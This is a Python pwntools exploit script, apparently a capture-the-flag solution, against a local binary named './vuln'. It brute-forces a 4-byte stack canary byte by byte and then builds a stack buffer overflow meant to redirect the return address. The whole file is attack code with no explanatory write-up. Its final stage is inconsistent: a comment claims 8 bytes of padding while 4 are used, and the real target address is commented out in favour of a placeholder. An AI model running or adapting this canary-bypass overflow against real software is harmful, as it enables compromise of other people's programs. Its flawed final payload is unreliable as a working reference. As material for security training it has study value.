#!/usr/bin/env python3
from pwn import *
taken = b''
for i in range(4):
    # Genera casualmente, uno alla volta, i byte del canarino
    for guess in range(256):
        guess_byte = bytes([guess])
        io = process('./vuln');
        print(io.recvuntil(b'> '))
        payload = str(64 + len(taken) + 1).encode()
        io.sendline(payload)
        print(io.recvuntil(b'Input> '))
        payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP'
        payload += (taken + guess_byte)
        io.sendline(payload)
        # Guarda la risposta
        output = io.recvline()
        print(output)
        if b"*****" not in output:
            taken += guess_byte
            print(f'Found byte {i+1}: {hex(guess)}')
            io.close()
            break
        io.close()
print(f'Canary value: {taken.hex()}')

# Esegui il programma un'ultima volta per stampare la flag
io = process('./vuln');
print(io.recvuntil(b'> '))

# Calculate proper size: buffer(64) + canary(4) + padding(8) + return address(4)
size = str(64 + 4 + 4 + 4).encode()
io.sendline(size)

print(io.recvuntil(b'Input> '))

# Initial buffer padding
final_payload = b'A' * 64
# Add the canary we discovered
final_payload += taken
# Add padding between canary and return address
final_payload += b'B' * 4
# Add the address of the win function
# final_payload += p32(0x08049336)
final_payload += b'0000'

io.sendline(final_payload)
io.interactive()
